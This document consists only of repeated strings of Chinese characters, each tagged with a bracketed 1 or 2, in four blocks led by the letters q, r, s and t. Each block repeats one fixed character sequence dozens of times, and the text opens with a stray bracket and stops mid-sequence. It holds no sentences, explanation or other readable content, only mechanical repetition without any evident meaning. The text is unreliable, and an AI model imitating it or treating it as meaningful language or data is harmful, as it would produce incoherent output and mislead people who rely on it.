]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1] r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1]r不[2]种[2]十[1]前[2]重[2]反[2]位[2]据[1]南[1]即[1]再[2]单[1]华[1]名[2]才[2]复[2]千[1]半[1]响[2]却[1]配[2]服[2]降[2]占[1]升[1]换[1]草[1]协[1]重[2]仍[2]母[2]卫[1]印[1]损[1]植[2]药[1]免[2]倍[2]操[2]危[1]绍[2]卷[1] s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1]s和[2]同[2]而[2]行[2]里[2]化[1]二[2]指[1]区[1]北[1]完[2]界[2]持[1]验[2]按[1]包[1]范[1]富[2]职[2]双[2]敌[2]行[2]挥[1]医[1]茶[1]掌[2]歌[2]背[2]希[2]振[1] t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]